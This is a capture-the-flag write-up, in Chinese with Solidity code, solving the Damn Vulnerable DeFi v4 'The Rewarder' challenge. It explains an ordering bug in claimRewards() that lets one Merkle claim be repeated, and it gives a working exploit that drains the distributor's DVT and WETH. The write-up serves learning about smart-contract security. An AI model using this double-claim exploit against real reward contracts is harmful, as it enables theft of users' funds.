# Damn Vulnerable DeFi v4 - the rewarder

- https://www.damnvulnerabledefi.xyz/challenges/the-rewarder/

## check condition

盡可能清空 distributor 的代幣，其持有的 dvt token 和 weth 需要少於一定值

```solidity
assertLt(
    dvt.balanceOf(address(distributor)),
    1e16,
    "Too much DVT in distributor"
);

assertLt(
    weth.balanceOf(address(distributor)),
    1e15,
    "Too much WETH in distributor"
);
```

將清空的資金轉移到 recovery

```solidity
assertEq(
    dvt.balanceOf(recovery),
    TOTAL_DVT_DISTRIBUTION_AMOUNT -
        ALICE_DVT_CLAIM_AMOUNT -
        dvt.balanceOf(address(distributor)),
    "Not enough DVT in recovery account"
);
assertEq(
    weth.balanceOf(recovery),
    TOTAL_WETH_DISTRIBUTION_AMOUNT -
        ALICE_WETH_CLAIM_AMOUNT -
        weth.balanceOf(address(distributor)),
    "Not enough WETH in recovery account"
);
```

## break

問題主要源於 `claimRewards()` 沒有以正確的執行順序去執行 `_setClaimed` 來更新狀態 (寫在 comment)：

```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    // init with address(0)
    IERC20 token;

    // 試想 i = 0 的情況
    for (uint256 i = 0; i < inputClaims.length; i++) {
       inputClaim = inputClaims[i];

        if (token != inputTokens[inputClaim.tokenIndex]) {
            // address(0) == address(0)，_setClaimed 被跳過了
            if (address(token) != address(0)) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }
            token = inputTokens[inputClaim.tokenIndex];
            bitsSet = 1 << bitPosition;
            amount = inputClaim.amount;
        } else {
            bitsSet = bitsSet | 1 << bitPosition;
            amount += inputClaim.amount;
        }

        // 等到最後一個 element 才會呼叫 _setClaimed
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }
    }
}
```

所以當 inputClaims 為 [tokenA, tokenA, tokenA]，會一直執行到 `i = length - 1` 才會執行 `_setClaimed`。

### solution

仿照 Alice 領取 reward 的寫法，然後增加 inputClaims 的長度即可：

#### 1. get player address

印出 player address，並從 json 檔找出其在 merkle tree 的 index

```solidity
console.log(player) // 0x44E97aF4418b7a17AABD8090bEA0A471a366305C

uint256 player_dvt_amount_index_188 = 11524763827831882;
uint256 player_weth_amount_index_188 = 1171088749244340;
```

#### 2. 建立 claim 需要的參數

```solidity
// 計算領完 dvt 和 weth 需要多少個 Claim struct
uint256 dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / player_dvt_amount_index_188;
uint256 wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / player_weth_amount_index_188;
uint256 totalTxCount = dvtTxCount + wethTxCount;

// load leaves
bytes32[] memory dvtLeaves = _loadRewards("/lib/damn-vulnerable-defi/test/the-rewarder/dvt-distribution.json");
bytes32[] memory wethLeaves = _loadRewards("/lib/damn-vulnerable-defi/test/the-rewarder/weth-distribution.json");

// create claim
Claim[] memory claims = new Claim[](totalTxCount);

for (uint256 i = 0; i < totalTxCount; i++) {
    if (i < dvtTxCount) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: player_dvt_amount_index_188,
            tokenIndex: 0,
            proof: merkle.getProof(dvtLeaves, 188)
        });
    } else {
        claims[i] = Claim({
            batchNumber: 0,
            amount: player_weth_amount_index_188,
            tokenIndex: 1,
            proof: merkle.getProof(wethLeaves, 188)
        });
    }
}
```

#### 3. trigger `claimRewards` and send to recovery

```solidity
distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

dvt.transfer(recovery, dvt.balanceOf(player));
weth.transfer(recovery, weth.balanceOf(player));
```
